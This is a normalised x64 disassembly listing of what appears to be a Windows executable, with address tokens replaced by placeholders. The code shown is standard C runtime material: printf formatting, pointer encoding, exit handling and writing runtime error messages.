mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call DecodePointer
test rax rax
je r-xdata
mov ecx 0x2
call sub_140005d24
mov r11 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r11
call sub_140003938
mov r10 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r10
call rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_140003ae8
lea r9 [ rw-data ]
xor eax eax
mov rdx r9
lea r8d [ rax + 0x8 ]
cdqe
mov eax [ r9 + rax * 8 + 0x4 ]
retn
inc eax
add rdx r8
cmp eax 0x2d
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
lea eax [ rcx - 0x13 ]
cmp eax 0x11
ja r-xdata
add ecx 0xffffff44
mov eax 0x16
cmp ecx 0xe
cmovbe eax r8d
retn
mov eax 0xd
retn
sub_140003b70
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1400036cc
test rax rax
jne r-xdata
add rax 0x14
lea rax [ rw-data ]
jmp r-xdata
mov ecx ebx
call sub_140003ae8
mov [ r10 ] eax
add rsp 0x20
pop rbx
retn
lea r10 [ rax + 0x10 ]
mov [ rax ] ebx
call sub_1400036cc
lea r10 [ rw-data ]
test rax rax
je r-xdata
sub_140003bb8
mov [ rsp + 0x8 ] cx
sub rsp 0x68
mov eax 0xffff
cmp cx ax
je r-xdata
add rsp 0x68
retn
lea rcx [ rsp + 0x40 ]
call sub_1400023d8
mov r11 [ rsp + 0x40 ]
mov edx [ r11 + 0x14 ]
test edx edx
jne r-xdata
movzx ecx [ rsp + 0x70 ]
mov r8d 0x100
cmp cx r8w
jae r-xdata
movzx edx [ rsp + 0x70 ]
lea eax [ rdx - 0x41 ]
cmp ax 0x19
ja r-xdata
mov eax [ r11 + 0x4 ]
lea r9 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x1
call sub_140007844
test eax eax
movzx eax [ rsp + 0x70 ]
je r-xdata
lea r8 [ rsp + 0x40 ]
mov edx 0x1
call sub_1400078e8
test eax eax
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
add dx 0x20
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x80 ]
mov rax [ rsp + 0x40 ]
movzx edx [ rsp + 0x70 ]
mov rcx [ rax + 0x148 ]
movzx eax [ rcx + rdx ]
jmp r-xdata
movzx eax [ rsp + 0x70 ]
jmp r-xdata
mov ax dx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140003cb4
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_1400086f0
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_140003b30
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_140003b30
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_1400084cc
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_1400082d4
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
cmp ebp edi
mov [ rbx + 0x8 ] eax
jle r-xdata
mov ecx esi
call sub_14000845c
cmp eax edi
jne r-xdata
call sub_1400084cc
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_1400082d4
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_140008408
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_140007a3c
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_140003e44
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
add [ rdx + 0x8 ] 0xffffffff
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_140003cb4
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_140003e8c
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_140003e44
cmp [ rdi ] 0xffffffff
je r-xdata
sub_140003ee0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rdi r9
mov rsi r8
mov ebx edx
mov rbp rcx
je r-xdata
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov cl [ rbp ]
mov r8 rdi
mov rdx rsi
dec ebx
call sub_140003e44
inc rbp
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test ebx ebx
jg r-xdata
call sub_140003b30
cmp [ rax ] 0x2a
jne r-xdata
mov r8 rdi
mov rdx rsi
mov cl 0x3f
call sub_140003e44
sub_140003f60
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rsp + 0x78 ]
mov rdx r8
mov r13 r9
mov [ rsp + 0x60 ] eax
mov r12d eax
mov [ rsp + 0x54 ] eax
mov r14d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x58 ] eax
mov [ rsp + 0x50 ] eax
call sub_1400023d8
xor r10d r10d
cmp rbx r10
jne r-xdata
or r15d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_140003b30
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_140003a60
cmp [ rsp + 0x90 ] bl
je r-xdata
cmp rdi r10
je r-xdata
mov rcx rbx
call sub_1400086f0
lea rdx [ rw-data ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_140003b30
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_140003a60
cmp [ rsp + 0x90 ] bl
mov bpl [ rdi ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x44 ] r10d
mov edx r10d
mov [ rsp + 0x98 ] r10
cmp bpl r10b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x2c8 ]
xor rcx rsp
call sub_140002370
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r15d
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x90 ] r10b
je r-xdata
mov rbx [ rsp + 0xa8 ]
mov r11d 0x200
cmp eax r15d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x91de0 ]
jmp r-xdata
mov eax esi
mov rcx [ rsp + 0x88 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ rbp - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax bpl
movsx ecx [ rax + r9 + 0xb3f0 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x91de0 ]
lea rdx [ rsp + 0x78 ]
movzx ecx bpl
mov [ rsp + 0x50 ] r10d
call sub_1400076a8
xor esi esi
cmp eax esi
je r-xdata
sub ecx 0x1
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0xb410 ]
sar edx 0x4
mov [ rsp + 0x5c ] edx
mov ecx edx
cmp edx r10d
je r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_140003e44
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_140003e44
mov bpl [ rdi ]
inc rdi
cmp bpl sil
je r-xdata
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x54 ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov r14d r15d
mov [ rsp + 0x50 ] r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
mov esi [ rsp + 0x40 ]
mov edx [ rsp + 0x5c ]
lea r9 [ __dos_header ]
mov r11d 0x200
call sub_140003b30
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
mov [ rax ] 0x16
call sub_140003a60
cmp [ rsp + 0x90 ] sil
jmp r-xdata
mov bpl [ rdi ]
cmp bpl r10b
jne r-xdata
cmp bpl 0x20
je r-xdata
sub ecx 0x1
je r-xdata
inc rdi
cmp esi r10d
mov [ rsp + 0xb0 ] rdi
jl r-xdata
je r-xdata
or r12d 0x2
jmp r-xdata
cmp bpl 0x23
je r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
bts r12d 0x7
jmp r-xdata
cmp bpl 0x2b
je r-xdata
mov eax [ rsp + 0x54 ]
lea ecx [ rax + rax * 4 ]
movsx eax bpl
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r13 ]
add r13 0x8
cmp eax r10d
mov [ rsp + 0x54 ] eax
jge r-xdata
mov r14d r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x1
jmp r-xdata
cmp bpl 0x2d
je r-xdata
or r12d 0x4
neg eax
jmp r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x4
jmp r-xdata
cmp bpl 0x30
jne r-xdata
mov [ rsp + 0x54 ] eax
jmp r-xdata
lea ecx [ r14 + r14 * 4 ]
movsx eax bpl
lea r14d [ rax + rcx * 2 - 0x30 ]
jmp r-xdata
mov r14d [ r13 ]
add r13 0x8
cmp r14d r10d
jge r-xdata
cmp bpl 0x49
je r-xdata
cmp ecx 0x1
jne r-xdata
or r12d 0x8
jmp r-xdata
mov r14d r15d
jmp r-xdata
mov al [ rdi ]
bts r12d 0xf
cmp al 0x36
jne r-xdata
cmp bpl 0x68
je r-xdata
movsx eax bpl
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdi + 0x1 ] 0x34
jne r-xdata
or r12d 0x20
jmp r-xdata
cmp bpl 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdi + 0x1 ] 0x32
jne r-xdata
add rdi 0x2
bts r12d 0xf
jmp r-xdata
cmp [ rdi ] 0x6c
jne r-xdata
cmp bpl 0x77
jne r-xdata
cmp [ rsp + 0x58 ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdi 0x2
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
inc rdi
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov rax [ rsp + 0x98 ]
cmp rax r10
je r-xdata
test r12b 0x40
je r-xdata
or r12d 0x40
cmp r14d r10d
lea rbx [ rsp + 0xc0 ]
mov esi r11d
jge r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r13 ]
add r13 0x8
jmp r-xdata
bt r12d 0xc
jae r-xdata
mov [ rsp + 0x70 ] 0x1
add bpl 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov rdi [ rsp + 0xb0 ]
mov rcx rax
call sub_1400069d4
xor r10d r10d
mov [ rsp + 0x98 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r14d 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12b 0x20
je r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c ]
mov r8 rbp
mov edx edi
call sub_140003ee0
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_140003e8c
test r12b 0x1
je r-xdata
mov [ rsp + 0x4c ] 0x2d
jmp r-xdata
cmp r14d r11d
cmovg r14d r11d
cmp r14d 0xa3
jle r-xdata
cmp bpl 0x67
jne r-xdata
mov rax [ r13 ]
mov rcx [ rw-data ]
add r13 0x8
movsx edi bpl
movsxd rsi esi
mov [ rsp + 0xa8 ] rax
call DecodePointer
lea rcx [ rsp + 0x78 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x70 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
lea rcx [ rsp + 0xa8 ]
mov rdx rbx
mov [ rsp + 0x20 ] r14d
call rax
mov edi r12d
xor eax eax
and edi 0x80
je r-xdata
mov rdi [ r13 ]
add r13 0x8
call sub_140008760
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x6f
je r-xdata
bt r12d 0xf
jb r-xdata
cmp r8 r10
jge r-xdata
test r12b 0x40
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12d 0x810
je r-xdata
bts r12d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x44 ]
xor eax eax
cmp [ rsp + 0x50 ] eax
je r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov [ rsp + 0x4c ] 0x2b
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
lea edi [ r14 + 0x15d ]
movsxd rcx edi
call sub_140006a14
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
mov r14d 0x1
jmp r-xdata
cmp bpl 0x67
jne r-xdata
cmp r14d eax
jne r-xdata
test r12b 0x20
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
cmp r14d r10d
jge r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov r8d [ r13 - 0x8 ]
movsxd r8 [ r13 - 0x8 ]
jmp r-xdata
movzx r8d [ r13 - 0x8 ]
jmp r-xdata
movsx r8 [ r13 - 0x8 ]
jmp r-xdata
mov al [ r13 - 0x8 ]
mov [ rsp + 0x44 ] 0x1
mov [ rsp + 0xc0 ] al
movzx r9d [ r13 - 0x8 ]
lea rdx [ rsp + 0xc0 ]
lea rcx [ rsp + 0x44 ]
mov r8 r11
call sub_140008988
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx edi
mov rcx rbx
call sub_140003ee0
xor r10d r10d
cmp edi eax
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x30
call sub_140003e8c
mov [ rsp + 0x4c ] 0x20
jmp r-xdata
mov esi [ rsp + 0x54 ]
mov rbp [ rsp + 0x68 ]
sub esi [ rsp + 0x44 ]
sub esi edi
test r12b 0xc
jne r-xdata
mov r14d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
cmp edi eax
jne r-xdata
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
xor eax eax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x48 ]
bts r12d 0x9
jmp r-xdata
mov r14d 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
and r12d 0xfffffff7
cmp r14d r11d
cmovg r14d r11d
mov r14d 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rsp + 0xc0 ]
jmp r-xdata
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x5c ] r10d
test r12b 0x4
je r-xdata
mov rbp rbx
mov rcx rbx
call sub_140007450
xor r10d r10d
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x4c ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x4d ] al
jmp r-xdata
mov rbx [ r13 ]
cmp r14d r15d
mov eax r14d
mov ecx 0x7fffffff
cmove eax ecx
add r13 0x8
test r12d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
cmp r8 r10
je r-xdata
mov r15d [ rsp + 0x60 ]
mov rax r8
lea rbx [ rsp + 0x2bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
bts r12d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_140003e8c
xor r10d r10d
mov rbp [ rsp + 0x68 ]
mov eax r15d
mov [ rsp + 0x40 ] eax
jmp r-xdata
mov edx [ rsp + 0xa0 ]
cmp edx r10d
je r-xdata
bt r12d 0xf
jb r-xdata
cmp rbx r10
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
cmp rbx r10
mov [ rsp + 0x50 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r15d
lea rax [ rsp + 0x2bf ]
mov r15d 0xffffffff
sub eax ebx
inc rbx
bt r12d 0x9
mov [ rsp + 0x44 ] eax
jae r-xdata
mov rax [ r13 ]
add r13 0x8
cmp rax r10
je r-xdata
cmp eax 0x61
je r-xdata
cmp eax r10d
jl r-xdata
mov r8 [ rsp + 0x68 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x2c0 ]
call sub_140003ee0
xor r10d r10d
cmp edi r10d
jne r-xdata
cmp eax r10d
jne r-xdata
cmp eax r10d
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx r14d
dec r14d
cmp ecx r10d
jg r-xdata
cmp eax r10d
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
mov rbx [ rax + 0x8 ]
cmp rbx r10
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rbp ]
lea rdx [ rsp + 0x2c0 ]
lea rcx [ rsp + 0xa0 ]
mov r8d 0x6
dec edi
add rbp 0x2
call sub_140008988
xor r10d r10d
cmp eax r10d
jne r-xdata
mov rbp [ rsp + 0x68 ]
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x60 ] eax
mov r9d 0x10
test r12b r12b
jns r-xdata
dec rbx
inc [ rsp + 0x44 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
bt r12d 0xb
movsx eax [ rax ]
jae r-xdata
jmp r-xdata
mov eax [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x44 ] ecx
jmp r-xdata
mov [ rsp + 0x50 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x50 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x44 ] eax
sub_140004a48
sub rsp 0x28
mov rax [ rcx ]
cmp [ rax ] 0xe06d7363
jne r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov eax [ rax + 0x20 ]
cmp eax 0x19930520
je r-xdata
call sub_14000899c
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_140004ad4
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_140004b40
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_140004b74
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_140004bb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_140008728
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_140004b74
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call sub_140008bc0
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_140005bec ]
call sub_140008b28
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ rw-data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_140008bc0
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_140004c60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_140006990
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
test r12d r12d
jne r-xdata
mov ecx 0x8
call sub_140006890
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_140004b40
nop
mov rcx [ rw-data ]
call DecodePointer
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov [ rw-data ] 0x1
lea ecx [ r12 + 0x8 ]
call sub_140006890
mov ecx r15d
call sub_140004ad4
mov ecx r15d
call [ ExitProcess@IAT ]
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_140004b40
mov rcx [ rw-data ]
call DecodePointer
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
cmp rdi rsi
jb r-xdata
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
mov rcx [ rdi ]
call DecodePointer
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
mov rcx [ rw-data ]
call DecodePointer
cmp r14 rbx
jne r-xdata
jmp r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
cmp r13 rax
je r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
jmp r-xdata
sub_140004e24
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_140008ef4
mov rcx rbx
call sub_140008eb4
mov rcx rbx
call sub_140003930
mov rcx rbx
call sub_140008eac
mov rcx rbx
call sub_140008ea4
mov rcx rbx
call sub_140008c04
mov rcx rbx
call sub_14000529c
mov rcx rbx
call sub_1400089c0
lea rcx [ sub_140004df8 ]
call __imp_EncodePointer
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
sub_140004e8c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r13
push r14
sub rsp 0x30
lea r14 [ rw-data ]
mov edi ecx
xor ebx ebx
mov rax r14
cmp ebx 0x17
jae r-xdata
inc ebx
add rax 0x10
cmp ebx 0x17
jb r-xdata
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x50 ]
mov r13 [ rsp + 0x58 ]
add rsp 0x30
pop r14
retn
mov ecx 0x3
call sub_140009124
cmp eax 0x1
je r-xdata
cmp ecx [ rax ]
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov ecx 0x3
call sub_140009124
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
movsxd rbx ebx
add rbx rbx
mov rcx [ r14 + rbx * 8 + 0x8 ]
call sub_140007450
mov rdx [ r14 + rbx * 8 + 0x8 ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
mov r8 rax
mov rcx rdi
call [ WriteFile@IAT ]
lea rdi [ rw-data ]
mov r13d 0x314
lea r8 [ r--data ]
mov rcx rdi
mov rdx r13
call sub_140007304
test eax eax
je r-xdata
lea rdx [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003938
lea rcx [ rw-data ]
call sub_140007450
inc rax
cmp rax 0x3c
